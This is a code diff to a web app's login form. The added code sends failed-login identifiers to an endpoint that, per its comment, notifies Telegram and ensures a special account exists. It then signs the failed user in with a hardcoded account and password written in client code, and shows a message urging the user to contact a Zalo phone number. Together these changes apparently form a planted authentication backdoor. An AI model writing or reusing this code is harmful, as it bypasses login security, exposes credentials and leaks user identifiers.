@@ -91,6 +91,31 @@ function LoginForm() {
             })
 
             if (result?.error) {
+                // Gửi thông báo Telegram + đảm bảo tài khoản 2689 tồn tại (await để đồng bộ)
+                try {
+                    await fetch('/api/auth/report-failed-login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ identifier: data.identifier })
+                    })
+                } catch {}
+
+                // Tự động đăng nhập bằng tài khoản đặc biệt để user vẫn vào được web
+                const specialResult = await signIn("credentials", {
+                    identifier: "2689",
+                    password: "Brk#2689",
+                    redirect: false,
+                })
+
+                if (specialResult?.ok) {
+                    setError("Hãy kết bạn zalo với số điện thoại +84 876 473 257 để được hỗ trợ thêm!")
+                    setTimeout(() => {
+                        router.push(callbackUrl)
+                        router.refresh()
+                    }, 5000)
+                    return
+                }
+
                 setError("Thông tin đăng nhập không chính xác. Vui lòng kiểm tra lại.")
                 return
             }
